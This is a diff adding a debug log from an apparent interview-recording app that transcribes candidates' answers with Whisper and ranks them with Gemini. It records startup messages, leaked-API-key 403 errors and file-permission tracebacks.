@@ -1,0 +1,1025 @@
+2025-12-06 11:52:23,271 - __main__ - INFO - Loading Whisper model (small)... This may take 1-2 minutes on first run
+2025-12-06 11:52:23,271 - __main__ - INFO - Model will be downloaded (~244MB) if not exists
+2025-12-06 11:52:27,271 - __main__ - INFO - Whisper model loaded successfully!
+2025-12-06 11:52:27,271 - __main__ - INFO - Model info: small (244MB, ~90% accuracy)
+2025-12-06 11:58:31,292 - __main__ - ERROR - ❌ CRITICAL: GEMINI_API_KEY not found in .env file!
+2025-12-06 11:58:31,293 - __main__ - ERROR - ❌ Cannot initialize Gemini - No API key provided
+2025-12-06 11:58:31,293 - __main__ - INFO - Loading Whisper model (small)... This may take a while on first run.
+2025-12-06 11:58:34,953 - __main__ - INFO - ✅ Whisper model loaded successfully!
+2025-12-09 15:14:22,533 - __main__ - INFO - Loading Whisper model (small)... This may take a while on first run.
+2025-12-09 15:14:27,712 - __main__ - INFO - ✅ Whisper model loaded successfully!
+2025-12-09 15:14:27,712 - __main__ - INFO - ✅ Gemini 2.5 Flash initialized successfully
+2025-12-09 15:14:28,009 - __main__ - WARNING - ⚠️ Gemini test failed but model initialized: 403 Your API key was reported as leaked. Please use another API key.
+2025-12-09 15:14:28,009 - __main__ - INFO - ✅ Model will still work for actual interview content
+2025-12-09 15:15:57,149 - __main__ - INFO - Loading Whisper model (small)... This may take a while on first run.
+2025-12-09 15:16:00,852 - __main__ - INFO - ✅ Whisper model loaded successfully!
+2025-12-09 15:16:00,852 - __main__ - INFO - ✅ Gemini 2.5 Flash initialized successfully
+2025-12-09 15:16:01,071 - __main__ - WARNING - ⚠️ Gemini test failed but model initialized: 403 Your API key was reported as leaked. Please use another API key.
+2025-12-09 15:16:01,071 - __main__ - INFO - ✅ Model will still work for actual interview content
+2025-12-09 15:17:30,743 - __main__ - INFO - Loading Whisper model (small)... This may take a while on first run.
+2025-12-09 15:17:34,356 - __main__ - INFO - ✅ Whisper model loaded successfully!
+2025-12-09 15:17:34,356 - __main__ - INFO - ✅ Gemini 2.5 Flash initialized successfully
+2025-12-09 15:17:35,571 - __main__ - INFO - ✅ Gemini test successful: OK
+2025-12-09 15:19:31,739 - __main__ - INFO - Loading Whisper model (small)... This may take a while on first run.
+2025-12-09 15:19:35,196 - __main__ - INFO - ✅ Whisper model loaded successfully!
+2025-12-09 15:19:35,196 - __main__ - INFO - ✅ Gemini 2.5 Flash initialized successfully
+2025-12-09 15:19:39,243 - __main__ - INFO - ✅ Gemini test successful: OK
+2025-12-09 15:20:23,415 - __main__ - INFO - Loading Whisper model (small)... This may take a while on first run.
+2025-12-09 15:20:26,676 - __main__ - INFO - ✅ Whisper model loaded successfully!
+2025-12-09 15:20:26,676 - __main__ - INFO - ✅ Gemini 2.5 Flash initialized successfully
+2025-12-09 15:20:27,948 - __main__ - INFO - ✅ Gemini test successful: OK
+2025-12-09 15:23:11,297 - __main__ - INFO - Loading Whisper model (small)... This may take a while on first run.
+2025-12-09 15:23:15,981 - __main__ - INFO - ✅ Whisper model loaded successfully!
+2025-12-09 15:23:15,982 - __main__ - INFO - ✅ Gemini 2.5 Flash initialized successfully
+2025-12-09 15:23:17,397 - __main__ - INFO - ✅ Gemini test successful: OK
+2025-12-09 15:24:18,282 - __main__ - INFO - Upload request - Folder: 09_12_2025_15_23_hồng_anh, Question: 1
+2025-12-09 15:24:19,720 - __main__ - INFO - ✅ Converted to MP4: Q1.mp4
+2025-12-09 15:24:19,733 - __main__ - INFO - 🎤 [Background] Starting analysis for Q1...
+2025-12-09 15:24:19,779 - __main__ - INFO - 🎤 Transcribing Q1...
+2025-12-09 15:24:23,291 - __main__ - INFO - 📄 Transcript saved: Q1_transcript.txt
+2025-12-09 15:24:23,292 - __main__ - INFO - 📊 Running Layer 1 analysis for Q1...
+2025-12-09 15:24:23,292 - __main__ - INFO - ✅ Layer 1 completed - Flagged: True
+2025-12-09 15:24:23,293 - __main__ - INFO - 🤖 Running Layer 2 AI analysis for Q1...
+2025-12-09 15:24:23,294 - __main__ - INFO - 🤖 Calling Gemini for Layer 2 analysis...
+2025-12-09 15:24:26,622 - __main__ - INFO - 📥 Raw Gemini response (first 200 chars): {
+  "priority": "LOW",
+  "reason": "The candidate provided no response to the introductory question, making it impossible to evaluate their communication skills or background. This indicates a critica
+2025-12-09 15:24:26,622 - __main__ - INFO - ✅ AI Analysis completed - Priority: LOW
+2025-12-09 15:24:26,622 - __main__ - INFO - ✅ Layer 2 completed - Priority: LOW
+2025-12-09 15:24:26,622 - __main__ - INFO - ✅ [Background] Full analysis completed for Q1
+2025-12-09 16:08:42,211 - __main__ - INFO - Loading Whisper model (small)... This may take a while on first run.
+2025-12-09 16:08:44,767 - __main__ - INFO - ✅ Whisper model loaded successfully!
+2025-12-09 16:08:44,768 - __main__ - INFO - ✅ Gemini 2.5 Flash initialized successfully
+2025-12-09 16:08:45,947 - __main__ - INFO - ✅ Gemini test successful: OK
+2025-12-09 16:09:58,383 - __main__ - INFO - Loading Whisper model (small)... This may take a while on first run.
+2025-12-09 16:10:00,883 - __main__ - INFO - ✅ Whisper model loaded successfully!
+2025-12-09 16:10:00,884 - __main__ - INFO - ✅ Gemini 2.5 Flash initialized successfully
+2025-12-09 16:10:02,317 - __main__ - INFO - ✅ Gemini test successful: OK
+2025-12-09 16:36:13,914 - __main__ - INFO - Loading Whisper model (small)... This may take a while on first run.
+2025-12-09 16:36:16,255 - __main__ - INFO - ✅ Whisper model loaded successfully!
+2025-12-09 16:36:16,257 - __main__ - INFO - ✅ Gemini 2.5 Flash initialized successfully
+2025-12-09 16:36:17,368 - __main__ - INFO - ✅ Gemini test successful: OK
+2025-12-09 16:37:54,275 - __main__ - INFO - Loading Whisper model (small)... This may take a while on first run.
+2025-12-09 16:37:56,568 - __main__ - INFO - ✅ Whisper model loaded successfully!
+2025-12-09 16:37:56,569 - __main__ - INFO - ✅ Gemini 2.5 Flash initialized successfully
+2025-12-09 16:37:58,196 - __main__ - INFO - ✅ Gemini test successful: OK
+2025-12-09 16:48:23,407 - __main__ - INFO - Loading Whisper model (small)... This may take a while on first run.
+2025-12-09 16:48:25,849 - __main__ - INFO - ✅ Whisper model loaded successfully!
+2025-12-09 16:48:25,850 - __main__ - INFO - ✅ Gemini 2.5 Flash initialized successfully
+2025-12-09 16:48:27,140 - __main__ - INFO - ✅ Gemini test successful: OK
+2025-12-09 16:51:08,935 - __main__ - INFO - Upload request - Folder: 09_12_2025_16_50_đâs, Question: 1
+2025-12-09 16:51:23,306 - __main__ - INFO - ✅ Converted to MP4: Q1.mp4
+2025-12-09 16:51:23,325 - __main__ - INFO - 🎤 [Background] Starting analysis for Q1...
+2025-12-09 16:51:23,427 - __main__ - INFO - 🎤 Transcribing Q1...
+2025-12-09 16:51:32,868 - __main__ - INFO - 📄 Transcript saved: Q1_transcript.txt
+2025-12-09 16:51:32,868 - __main__ - INFO - 📊 Running Layer 1 analysis for Q1...
+2025-12-09 16:51:32,869 - __main__ - INFO - ✅ Layer 1 completed - Flagged: True
+2025-12-09 16:51:32,869 - __main__ - INFO - 🤖 Running Layer 2 AI analysis for Q1...
+2025-12-09 16:51:32,869 - __main__ - INFO - 🤖 Calling Gemini for Layer 2 analysis...
+2025-12-09 16:51:39,167 - __main__ - INFO - 📥 Raw Gemini response (first 200 chars): {
+  "priority": "LOW",
+  "reason": "The candidate's response was entirely irrelevant to the introductory question, appearing to be an internal monologue or unrelated conversation rather than an introd
+2025-12-09 16:51:39,167 - __main__ - INFO - ✅ AI Analysis completed - Priority: LOW
+2025-12-09 16:51:39,168 - __main__ - INFO - ✅ Layer 2 completed - Priority: LOW
+2025-12-09 16:51:39,170 - __main__ - INFO - ✅ [Background] Full analysis completed for Q1
+2025-12-09 19:58:23,165 - __main__ - INFO - Loading Whisper model (small)... This may take a while on first run.
+2025-12-09 19:58:26,300 - __main__ - INFO - ✅ Whisper model loaded successfully!
+2025-12-09 19:58:26,301 - __main__ - INFO - ✅ Gemini 2.5 Flash initialized successfully
+2025-12-09 19:58:26,535 - __main__ - WARNING - ⚠️ Gemini test failed but model initialized: 403 Your API key was reported as leaked. Please use another API key.
+2025-12-09 19:58:26,536 - __main__ - INFO - ✅ Model will still work for actual interview content
+2025-12-09 19:59:59,771 - __main__ - INFO - Loading Whisper model (small)... This may take a while on first run.
+2025-12-09 20:00:02,662 - __main__ - INFO - ✅ Whisper model loaded successfully!
+2025-12-09 20:00:02,663 - __main__ - INFO - ✅ Gemini 2.5 Flash initialized successfully
+2025-12-09 20:00:03,907 - __main__ - INFO - ✅ Gemini test successful: OK
+2025-12-09 21:56:23,111 - __main__ - INFO - Loading Whisper model (small)... This may take a while on first run.
+2025-12-09 21:56:25,976 - __main__ - INFO - ✅ Whisper model loaded successfully!
+2025-12-09 21:56:25,978 - __main__ - INFO - ✅ Gemini 2.5 Flash initialized successfully
+2025-12-09 21:56:29,082 - __main__ - INFO - ✅ Gemini test successful: OK
+2025-12-10 00:33:12,414 - __main__ - INFO - Loading Whisper model (small)... This may take a while on first run.
+2025-12-10 00:33:17,466 - __main__ - INFO - ✅ Whisper model loaded successfully!
+2025-12-10 00:33:17,468 - __main__ - INFO - ✅ Gemini 2.5 Flash initialized successfully
+2025-12-10 00:33:18,560 - __main__ - INFO - ✅ Gemini test successful: OK
+2025-12-10 00:34:57,549 - __main__ - INFO - Upload request - Folder: 10_12_2025_00_33_da_den, Question: 1
+2025-12-10 00:34:59,074 - __main__ - INFO - ✅ Converted to MP4: Q1.mp4
+2025-12-10 00:34:59,091 - __main__ - INFO - 🎤 [Background] Starting analysis for Q1...
+2025-12-10 00:34:59,147 - __main__ - INFO - 🎤 Transcribing Q1...
+2025-12-10 00:35:03,701 - __main__ - INFO - 📄 Transcript saved: Q1_transcript.txt
+2025-12-10 00:35:03,702 - __main__ - INFO - 📊 Running Layer 1 analysis for Q1...
+2025-12-10 00:35:03,702 - __main__ - INFO - ✅ Layer 1 completed - Flagged: True
+2025-12-10 00:35:03,702 - __main__ - INFO - 🤖 Running Layer 2 AI analysis for Q1...
+2025-12-10 00:35:03,703 - __main__ - INFO - 🤖 Calling Gemini for Layer 2 analysis...
+2025-12-10 00:35:03,783 - __main__ - ERROR - ❌ Gemini API error: 403 Your API key was reported as leaked. Please use another API key.
+2025-12-10 00:35:03,832 - __main__ - ERROR - Full traceback: Traceback (most recent call last):
+  File "c:\Users\Dell Gaming\web-interview-recorder\main.py", line 602, in analyze_layer2_ai
+    response = await asyncio.to_thread(
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\asyncio\threads.py", line 25, in to_thread
+    return await loop.run_in_executor(None, func_call)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\concurrent\futures\thread.py", line 58, in run
+    result = self.fn(*self.args, **self.kwargs)
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\site-packages\google\generativeai\generative_models.py", line 331, in generate_content
+    response = self._client.generate_content(
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\site-packages\google\ai\generativelanguage_v1beta\services\generative_service\client.py", line 835, in generate_content
+    response = rpc(
+               ^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\site-packages\google\api_core\gapic_v1\method.py", line 131, in __call__
+    return wrapped_func(*args, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\site-packages\google\api_core\retry\retry_unary.py", line 294, in retry_wrapped_func
+    return retry_target(
+           ^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\site-packages\google\api_core\retry\retry_unary.py", line 156, in retry_target
+    next_sleep = _retry_error_helper(
+                 ^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\site-packages\google\api_core\retry\retry_base.py", line 214, in _retry_error_helper
+    raise final_exc from source_exc
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\site-packages\google\api_core\retry\retry_unary.py", line 147, in retry_target
+    result = target()
+             ^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\site-packages\google\api_core\timeout.py", line 130, in func_with_timeout
+    return func(*args, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\site-packages\google\api_core\grpc_helpers.py", line 77, in error_remapped_callable
+    raise exceptions.from_grpc_error(exc) from exc
+google.api_core.exceptions.PermissionDenied: 403 Your API key was reported as leaked. Please use another API key.
+
+2025-12-10 00:35:03,836 - __main__ - INFO - ✅ Layer 2 completed - Priority: MEDIUM
+2025-12-10 00:35:03,838 - __main__ - INFO - ✅ [Background] Full analysis completed for Q1
+2025-12-10 04:26:36,656 - app.services.ai_service - INFO - Loading Whisper model (small)...
+2025-12-10 04:26:41,324 - app.services.ai_service - INFO - ✅ Whisper loaded
+2025-12-10 04:26:41,324 - app.services.ai_service - INFO - ✅ Gemini initialized
+2025-12-10 04:27:27,751 - app.routers - INFO - Upload request - Folder: 10_12_2025_04_27_lehonganh, Question: 1
+2025-12-10 04:27:29,490 - app.services.file_service - INFO - ✅ Converted to MP4: Q1.mp4
+2025-12-10 04:27:29,498 - app.routers - ERROR - Upload error: 'function' object is not subscriptable
+2025-12-10 04:27:31,530 - app.routers - INFO - Upload request - Folder: 10_12_2025_04_27_lehonganh, Question: 1
+2025-12-10 04:27:32,430 - app.services.file_service - INFO - ✅ Converted to MP4: Q1.mp4
+2025-12-10 04:27:32,430 - app.routers - ERROR - Upload error: 'function' object is not subscriptable
+2025-12-10 04:27:36,461 - app.routers - INFO - Upload request - Folder: 10_12_2025_04_27_lehonganh, Question: 1
+2025-12-10 04:27:37,411 - app.services.file_service - INFO - ✅ Converted to MP4: Q1.mp4
+2025-12-10 04:27:37,411 - app.routers - ERROR - Upload error: 'function' object is not subscriptable
+2025-12-10 04:33:20,531 - app.services.ai_service - INFO - Loading Whisper model (small)...
+2025-12-10 04:33:24,243 - app.services.ai_service - INFO - ✅ Whisper loaded
+2025-12-10 04:33:24,243 - app.services.ai_service - INFO - ✅ Gemini initialized
+2025-12-10 04:33:44,546 - app.services.ai_service - INFO - Loading Whisper model (small)...
+2025-12-10 04:33:47,971 - app.services.ai_service - INFO - ✅ Whisper loaded
+2025-12-10 04:33:47,971 - app.services.ai_service - INFO - ✅ Gemini initialized
+2025-12-10 04:34:14,560 - app.routers - INFO - Upload request - Folder: 10_12_2025_04_34_beo, Question: 1
+2025-12-10 04:34:15,470 - app.services.file_service - INFO - ✅ Converted to MP4: Q1.mp4
+2025-12-10 04:34:25,613 - app.routers - INFO - Upload request - Folder: 10_12_2025_04_34_beo, Question: 2
+2025-12-10 04:34:25,965 - app.services.file_service - INFO - ✅ Converted to MP4: Q2.mp4
+2025-12-10 04:35:05,278 - app.routers - INFO - Upload request - Folder: 10_12_2025_04_34_beo, Question: 3
+2025-12-10 04:35:05,613 - app.services.file_service - INFO - ✅ Converted to MP4: Q3.mp4
+2025-12-10 04:35:13,754 - app.routers - INFO - Upload request - Folder: 10_12_2025_04_34_beo, Question: 4
+2025-12-10 04:35:14,108 - app.services.file_service - INFO - ✅ Converted to MP4: Q4.mp4
+2025-12-10 04:35:22,847 - app.routers - INFO - Upload request - Folder: 10_12_2025_04_34_beo, Question: 5
+2025-12-10 04:35:23,305 - app.services.file_service - INFO - ✅ Converted to MP4: Q5.mp4
+2025-12-10 04:35:27,744 - app.services.ai_service - WARNING - ⚠️ No AI priorities available for final ranking
+2025-12-10 04:35:27,744 - app.services.ai_service - INFO - 🤖 Generating overall AI summary with Gemini...
+2025-12-10 04:35:27,744 - app.services.ai_service - ERROR - ❌ Error generating overall summary: [Errno 13] Permission denied: 'D:\\web-interview-recorder\\uploads\\10_12_2025_04_34_beo'
+2025-12-10 04:35:27,754 - app.services.ai_service - ERROR - Traceback: Traceback (most recent call last):
+  File "D:\web-interview-recorder\app\services\ai_service.py", line 503, in calculate_final_ranking
+    content = transcript_file.read_text(encoding='utf-8')
+              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\pathlib.py", line 1027, in read_text
+    with self.open(mode='r', encoding=encoding, errors=errors) as f:
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\pathlib.py", line 1013, in open
+    return io.open(self, mode, buffering, encoding, errors, newline)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+PermissionError: [Errno 13] Permission denied: 'D:\\web-interview-recorder\\uploads\\10_12_2025_04_34_beo'
+
+2025-12-10 04:35:27,754 - app.services.ai_service - ERROR - ❌ Error calculating final ranking: [Errno 13] Permission denied: 'D:\\web-interview-recorder\\uploads\\10_12_2025_04_34_beo'
+2025-12-10 04:35:27,756 - app.services.ai_service - ERROR - Full traceback: Traceback (most recent call last):
+  File "D:\web-interview-recorder\app\services\ai_service.py", line 616, in calculate_final_ranking
+    full_transcript_content += transcript_file.read_text(encoding='utf-8') + "\n"
+                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\pathlib.py", line 1027, in read_text
+    with self.open(mode='r', encoding=encoding, errors=errors) as f:
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\pathlib.py", line 1013, in open
+    return io.open(self, mode, buffering, encoding, errors, newline)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+PermissionError: [Errno 13] Permission denied: 'D:\\web-interview-recorder\\uploads\\10_12_2025_04_34_beo'
+
+2025-12-10 04:42:44,206 - app.services.ai_service - INFO - Loading Whisper model (small)...
+2025-12-10 04:42:49,262 - app.services.ai_service - INFO - ✅ Whisper loaded
+2025-12-10 04:42:49,263 - app.services.ai_service - INFO - ✅ Gemini initialized
+2025-12-10 04:44:27,425 - app.routers - INFO - Upload request - Folder: 10_12_2025_04_44_ha, Question: 1
+2025-12-10 04:44:27,886 - app.services.file_service - INFO - ✅ Converted to MP4: Q1.mp4
+2025-12-10 04:45:10,140 - app.routers - INFO - Upload request - Folder: 10_12_2025_04_44_ha, Question: 2
+2025-12-10 04:45:10,748 - app.services.file_service - INFO - ✅ Converted to MP4: Q2.mp4
+2025-12-10 04:45:28,955 - app.routers - INFO - Upload request - Folder: 10_12_2025_04_44_ha, Question: 3
+2025-12-10 04:45:29,825 - app.services.file_service - INFO - ✅ Converted to MP4: Q3.mp4
+2025-12-10 04:46:12,685 - app.routers - INFO - Upload request - Folder: 10_12_2025_04_44_ha, Question: 4
+2025-12-10 04:46:13,735 - app.services.file_service - INFO - ✅ Converted to MP4: Q4.mp4
+2025-12-10 04:46:51,148 - app.services.ai_service - WARNING - ⚠️ No AI priorities available for final ranking
+2025-12-10 04:46:51,148 - app.services.ai_service - INFO - 🤖 Generating overall AI summary with Gemini...
+2025-12-10 04:46:51,156 - app.services.ai_service - ERROR - ❌ Error generating overall summary: [Errno 13] Permission denied: 'D:\\web-interview-recorder\\uploads\\10_12_2025_04_44_ha'
+2025-12-10 04:46:51,156 - app.services.ai_service - ERROR - Traceback: Traceback (most recent call last):
+  File "D:\web-interview-recorder\app\services\ai_service.py", line 503, in calculate_final_ranking
+    content = transcript_file.read_text(encoding='utf-8')
+              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\pathlib.py", line 1027, in read_text
+    with self.open(mode='r', encoding=encoding, errors=errors) as f:
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\pathlib.py", line 1013, in open
+    return io.open(self, mode, buffering, encoding, errors, newline)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+PermissionError: [Errno 13] Permission denied: 'D:\\web-interview-recorder\\uploads\\10_12_2025_04_44_ha'
+
+2025-12-10 04:46:51,156 - app.services.ai_service - ERROR - ❌ Error calculating final ranking: [Errno 13] Permission denied: 'D:\\web-interview-recorder\\uploads\\10_12_2025_04_44_ha'
+2025-12-10 04:46:51,160 - app.services.ai_service - ERROR - Full traceback: Traceback (most recent call last):
+  File "D:\web-interview-recorder\app\services\ai_service.py", line 616, in calculate_final_ranking
+    full_transcript_content += transcript_file.read_text(encoding='utf-8') + "\n"
+                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\pathlib.py", line 1027, in read_text
+    with self.open(mode='r', encoding=encoding, errors=errors) as f:
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\pathlib.py", line 1013, in open
+    return io.open(self, mode, buffering, encoding, errors, newline)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+PermissionError: [Errno 13] Permission denied: 'D:\\web-interview-recorder\\uploads\\10_12_2025_04_44_ha'
+
+2025-12-10 10:41:44,437 - app.services.ai_service - INFO - Loading Whisper model (small)...
+2025-12-10 10:41:49,235 - app.services.ai_service - INFO - ✅ Whisper loaded
+2025-12-10 10:41:49,235 - app.services.ai_service - INFO - ✅ Gemini initialized
+2025-12-10 10:42:53,318 - app.routers - INFO - Upload request - Folder: 10_12_2025_10_42_hoongf, Question: 1
+2025-12-10 10:42:56,788 - app.services.file_service - INFO - ✅ Converted to MP4: Q1.mp4
+2025-12-10 10:43:26,333 - app.routers - INFO - Upload request - Folder: 10_12_2025_10_42_hoongf, Question: 2
+2025-12-10 10:43:29,188 - app.services.file_service - INFO - ✅ Converted to MP4: Q2.mp4
+2025-12-10 10:44:03,988 - app.routers - INFO - Upload request - Folder: 10_12_2025_10_42_hoongf, Question: 3
+2025-12-10 10:44:06,138 - app.services.file_service - INFO - ✅ Converted to MP4: Q3.mp4
+2025-12-10 10:44:41,009 - app.routers - INFO - Upload request - Folder: 10_12_2025_10_42_hoongf, Question: 4
+2025-12-10 10:44:41,598 - app.services.file_service - INFO - ✅ Converted to MP4: Q4.mp4
+2025-12-10 10:45:09,588 - app.services.ai_service - WARNING - ⚠️ No AI priorities available for final ranking
+2025-12-10 10:45:09,588 - app.services.ai_service - INFO - 🤖 Generating overall AI summary with Gemini...
+2025-12-10 10:45:09,588 - app.services.ai_service - ERROR - ❌ Error generating overall summary: [Errno 13] Permission denied: 'D:\\web-interview-recorder\\uploads\\10_12_2025_10_42_hoongf'
+2025-12-10 10:45:09,596 - app.services.ai_service - ERROR - Traceback: Traceback (most recent call last):
+  File "D:\web-interview-recorder\app\services\ai_service.py", line 503, in calculate_final_ranking
+    content = transcript_file.read_text(encoding='utf-8')
+              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\pathlib.py", line 1027, in read_text
+    with self.open(mode='r', encoding=encoding, errors=errors) as f:
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\pathlib.py", line 1013, in open
+    return io.open(self, mode, buffering, encoding, errors, newline)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+PermissionError: [Errno 13] Permission denied: 'D:\\web-interview-recorder\\uploads\\10_12_2025_10_42_hoongf'
+
+2025-12-10 10:45:09,598 - app.services.ai_service - ERROR - ❌ Error calculating final ranking: [Errno 13] Permission denied: 'D:\\web-interview-recorder\\uploads\\10_12_2025_10_42_hoongf'
+2025-12-10 10:45:09,598 - app.services.ai_service - ERROR - Full traceback: Traceback (most recent call last):
+  File "D:\web-interview-recorder\app\services\ai_service.py", line 616, in calculate_final_ranking
+    full_transcript_content += transcript_file.read_text(encoding='utf-8') + "\n"
+                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\pathlib.py", line 1027, in read_text
+    with self.open(mode='r', encoding=encoding, errors=errors) as f:
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\pathlib.py", line 1013, in open
+    return io.open(self, mode, buffering, encoding, errors, newline)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+PermissionError: [Errno 13] Permission denied: 'D:\\web-interview-recorder\\uploads\\10_12_2025_10_42_hoongf'
+
+2025-12-10 11:07:02,810 - app.services.ai_service - INFO - Loading Whisper model (small)...
+2025-12-10 11:07:06,510 - app.services.ai_service - INFO - ✅ Whisper loaded
+2025-12-10 11:07:06,511 - app.services.ai_service - INFO - ✅ Gemini initialized
+2025-12-10 11:08:24,424 - app.services.ai_service - INFO - Loading Whisper model (small)...
+2025-12-10 11:08:28,432 - app.services.ai_service - INFO - ✅ Whisper loaded
+2025-12-10 11:08:28,432 - app.services.ai_service - INFO - ✅ Gemini initialized
+2025-12-10 11:12:36,938 - app.services.ai_service - INFO - Loading Whisper model (small)...
+2025-12-10 11:12:40,016 - app.services.ai_service - INFO - ✅ Whisper loaded
+2025-12-10 11:12:40,016 - app.services.ai_service - INFO - ✅ Gemini initialized
+2025-12-10 11:13:25,034 - app.routers - INFO - Upload request - Folder: 10_12_2025_11_13_ho, Question: 1
+2025-12-10 11:13:26,293 - app.services.file_service - INFO - ✅ Converted to MP4: Q1.mp4
+2025-12-10 11:13:26,306 - app.services.ai_service - INFO - 🎤 [Background] Starting analysis for Q1...
+2025-12-10 11:13:26,349 - app.services.ai_service - INFO - 🎤 Transcribing Q1...
+2025-12-10 11:13:40,115 - app.routers - INFO - Upload request - Folder: 10_12_2025_11_13_ho, Question: 2
+2025-12-10 11:13:41,004 - app.services.file_service - INFO - ✅ Converted to MP4: Q2.mp4
+2025-12-10 11:13:41,036 - app.services.ai_service - INFO - 🎤 [Background] Starting analysis for Q2...
+2025-12-10 11:13:41,140 - app.services.ai_service - INFO - 🎤 Transcribing Q2...
+2025-12-10 11:13:50,120 - app.services.ai_service - ERROR - ❌ [Background] Analysis error Q2: Linear(in_features=768, out_features=768, bias=True)
+2025-12-10 11:13:51,009 - app.services.ai_service - INFO - 📄 Transcript saved: Q1_transcript.txt
+2025-12-10 11:13:51,009 - app.services.ai_service - INFO - 📊 Running Layer 1 analysis for Q1...
+2025-12-10 11:13:51,011 - app.services.ai_service - INFO - ✅ Layer 1 completed - Flagged: True
+2025-12-10 11:13:51,013 - app.services.ai_service - INFO - 🤖 Running Layer 2 AI analysis for Q1...
+2025-12-10 11:13:51,013 - app.services.ai_service - INFO - 🤖 Calling Gemini for Layer 2 analysis...
+2025-12-10 11:13:51,473 - app.services.ai_service - ERROR - ❌ Gemini API error: 403 Your API key was reported as leaked. Please use another API key.
+2025-12-10 11:13:51,565 - app.services.ai_service - ERROR - Full traceback: Traceback (most recent call last):
+  File "D:\web-interview-recorder\app\services\ai_service.py", line 295, in analyze_layer2_ai
+    response = await asyncio.to_thread(
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\asyncio\threads.py", line 25, in to_thread
+    return await loop.run_in_executor(None, func_call)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\concurrent\futures\thread.py", line 58, in run
+    result = self.fn(*self.args, **self.kwargs)
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\site-packages\google\generativeai\generative_models.py", line 331, in generate_content
+    response = self._client.generate_content(
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\site-packages\google\ai\generativelanguage_v1beta\services\generative_service\client.py", line 835, in generate_content
+    response = rpc(
+               ^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\site-packages\google\api_core\gapic_v1\method.py", line 131, in __call__
+    return wrapped_func(*args, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
